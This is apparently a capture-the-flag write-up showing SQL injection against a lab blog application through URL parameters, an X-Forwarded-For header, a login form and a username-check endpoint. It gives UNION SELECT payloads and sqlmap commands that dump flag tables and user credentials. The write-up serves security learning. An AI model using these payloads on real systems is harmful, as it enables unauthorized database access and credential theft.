At the start there is blog site.  

![image](https://github.com/user-attachments/assets/86bd1fda-4606-45f5-9a96-9a4f0b9a992d)

The second blog post is selected for initial testing.
```SQL
/post?id=2
```

The id parameter is likely used in a backend SQL query such as:

```SQL
SELECT * from blog where id=2...
```

Add a single quote after id number to test for SQL injection.

![image-1](https://github.com/user-attachments/assets/e7348f9f-eea5-43ba-ae08-ae18b10a844f)

This returns an SQL syntax error, confirming that user input is not properly sanitized and is directly inserted into an SQL query. The error message also confirms that the backend database is MySQL.

<span>&nbsp;</span>

Use a UNION SELECT payload to identify how many columns the original query returns. A response with no error indicates there are four columns.
```SQL
/post?id=2 UNION SELECT 1,2,3,4
```

![image-31](https://github.com/user-attachments/assets/c2ce63f7-d869-4049-9c3f-1a674af74661)

The next step is to extract database information using built-in MySQL functions such as DATABASE() and VERSION().
```SQL
/post?id=-1 UNION SELECT 1,DATABASE(),VERSION(),4- -
```  
![image-32](https://github.com/user-attachments/assets/973682ec-98b0-4336-aaa7-d27b03f6d1b3)


The query reveals that the current database in use is named sqhell_5.

<span>&nbsp;</span>

Table information can be retrieved in two ways: manually through injection or using automation tools like sqlmap.
1. SQL injection via URL:
```SQL
/post?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='sqhell_5'),3,4-- -
```

![image-33](https://github.com/user-attachments/assets/059a245c-9b14-47a3-be4b-7564c09534f5)

```SQL
/post?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag'),3,4-- -
```

![image-36](https://github.com/user-attachments/assets/35b14111-a045-4332-8d60-c7c0e0af41f3)

```SQL
/post?id=-1 UNION SELECT 1,(SELECT flag FROM flag LIMIT 0,1),3,4-- -
```

![image-37](https://github.com/user-attachments/assets/1726bfcf-0a3a-4d8c-88f2-b01839516f86)

<span>&nbsp;</span>

2. Use sqlmap
```BASH
sqlmap -u "http://$ip/post?id=2" --dbms=mysql -D sqhell_5 --tables --batch
```

![image-34](https://github.com/user-attachments/assets/15be73e1-df16-4e08-aea9-dadef8acbf38)

The sqhell_5 database contains three tables: flag, posts, and users. The contents of the flag table are dumped next.
```BASH
sqlmap -u "http://$ip/post?id=1" -D sqhell_5 -T flag --dump --batch
```

![image-35](https://github.com/user-attachments/assets/9d49d7b9-7c6c-4a99-8a69-847eb763d839)

<span>&nbsp;</span>

A hint in the "Terms and Conditions" page mentions IP logging, suggesting that IP addresses may be stored directly in the database, which is a possible injection point.
```BASH
sqlmap -u "http://$ip/terms-and-conditions" --headers="X-Forwarded-For: 127.0.0.1*" --dbms=mysql --batch
```

![image-9](https://github.com/user-attachments/assets/045f78d5-71cc-45d4-a730-e410f7fc262a)

Since HTTP headers cannot be modified directly via the browser, sqlmap is used to test for injection through the X-Forwarded-For header.
``` BASH
sqlmap -u "http://$ip/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T --dbs
``` 

![image-10](https://github.com/user-attachments/assets/783ffe39-1c5d-4240-931f-aac8fe36fb28)

The sqhell_1 schema is then enumerated to identify its tables.
``` BASH
sqlmap -u "http://$ip/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T -D sqhell_1 --tables
``` 

Data is extracted from the flag table within the sqhell_1 database.

![image-11](https://github.com/user-attachments/assets/4f4f28c0-64a8-4e6c-aa67-4aa08abe7cce)

``` BASH
sqlmap -u "http://$ip/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T -D sqhell_1 -T flag --dump
``` 

![image-12](https://github.com/user-attachments/assets/b11edfd1-11a6-4c7a-b9ef-4ed8b15cdd24)

<span>&nbsp;</span>

The application also includes login and registration functionality. The registration page is checked to verify whether an admin user already exists.

![image-17](https://github.com/user-attachments/assets/68b6754a-5be6-4ae5-b214-7db8c39e2312)

This confirms that an admin account is already present in the database. Catch POST request in Burp:  

![image-18](https://github.com/user-attachments/assets/b5ba34bf-685e-4be9-82c5-3d61fbdd19ad)

The intercepted login request is saved to a file and used with sqlmap to test the login form for SQL injection.
```BASH
sqlmap -r request.txt --dbms=mysql --batch --level=3 --risk=3
```

![image-19](https://github.com/user-attachments/assets/90e33ad9-3196-4b57-b269-b3662e27f0c7)

The login form is found to be vulnerable to multiple forms of blind SQL injection, including boolean-based, time-based, and stacked queries.

Check for db name:
```BASH
sqlmap -r request.txt -p username --dbms=mysql --batch --current-db
```  

![image-20](https://github.com/user-attachments/assets/c5f10744-8060-40d6-81ba-c42bb2d934a0)

![image-21](https://github.com/user-attachments/assets/23f56076-9e7c-4cec-9b6f-0e6d8f583a88)

The extracted data reveals a users table containing valid user credentials, including plaintext passwords. 
```BASH
sqlmap -r request.txt -p username --dbms=mysql --batch -D sqhell_2 -T users --dump
```

![image-22](https://github.com/user-attachments/assets/3a072cdb-4495-4ed9-aeb9-ff35ed252bfe)

Using the admin credentials, it is possible to log in and access a page containing flag1.  

![image-23](https://github.com/user-attachments/assets/17c6e1b0-501c-4565-9c59-864068db9668)

Right now we know about sqhell_1, sqhell_2, sqhell_4 and sqhell_5. What about sqhell_3?

Although new registrations are disabled, the application still performs live checks against existing usernames. Exploit user-check directly if possible by sqlmap. 
```BASH
sqlmap -u "http://$ip/register/user-check?username=*" --dbms=mysql --batch --level=3 --risk=3
```

![image-24](https://github.com/user-attachments/assets/2a21e9dc-c9c4-454f-bde5-e0157a0ac7ae)

The next step is to determine which database is being used by this endpoint.
```BASH
sqlmap -u "http://$ip/register/user-check?username=*" --dbms=mysql --batch --current-db
```

![image-25](https://github.com/user-attachments/assets/59432ea9-6e1c-4672-bcd6-6f492147eef2)

The active database is identified as sqhell_3, and its tables are enumerated.
```BASH
sqlmap -u "http://$ip/register/user-check?username=*" --dbms=mysql --batch -D sqhell_3 --tables
```

![image-26](https://github.com/user-attachments/assets/624bf835-234e-4c26-a630-8f83498df1fe)

Get flag.
```BASH
sqlmap -u "http://$ip/register/user-check?username=*" --dbms=mysql --batch -D sqhell_3 -T flag --dump
```

![image-27](https://github.com/user-attachments/assets/745ef225-5e1d-4a68-8bc1-48bfdc46b7e8)

<span>&nbsp;</span>

The final endpoint of interest is the /user page.
There are two ways:
1. SQL injection via URL:
```SQL
/user?id=1 UNION SELECT 1,2,3-- -
```
![image-38](https://github.com/user-attachments/assets/bd4452c8-e92a-42f1-9804-dccb3e4b0c38)

```SQL
/user?id=-1 UNION SELECT 1,DATABASE(),VERSION()-- -
```
![image-39](https://github.com/user-attachments/assets/ec876657-0cc7-4491-8342-e0e7bfad9e6a)

```SQL
/user?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='sqhell_4'),3-- -
```
![image-41](https://github.com/user-attachments/assets/d4e73468-e2d4-42fe-a661-3d5f1bc06f0d)

```SQL
/user?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),3-- -
```
![image-42](https://github.com/user-attachments/assets/aa91c434-01bf-4a3f-b31c-4f7e6f374dbb)

```SQL
/user?id=-1 UNION SELECT 1,(SELECT CONCAT(password, ':', username) FROM users LIMIT 0,1),3-- -
```
![image-43](https://github.com/user-attachments/assets/a89f9e2c-eb1f-4cfd-a966-a6d28037df9a)

<span>&nbsp;</span>

2. Use sqlmap
sqlmap is used to enumerate tables and extract their contents from the sqhell_4 database. 
```BASH
sqlmap -u "$ip/user?id=1" --dbms=mysql --batch --current-db
sqlmap -u "$ip/user?id=1" --dbms=mysql --batch -D sqhell_4 --tables
sqlmap -u "$ip/user?id=1" --dbms=mysql --batch -D sqhell_4 -T users --dump
```
![image-29](https://github.com/user-attachments/assets/b3c2d30d-62d3-4879-af8d-3d2efb5e5220)


If the previous methods fail to extract the flag, a crafted payload can be used to retrieve it by injecting a nested query.
```SQL
/user?id=2 UNION SELECT "1 UNION SELECT null,flag,null,null from flag",null,null FROM information_schema.tables WHERE table_schema=database()
```
![image-30](https://github.com/user-attachments/assets/fb8c59d2-d7dd-4739-b4c5-b6890ca445bf)


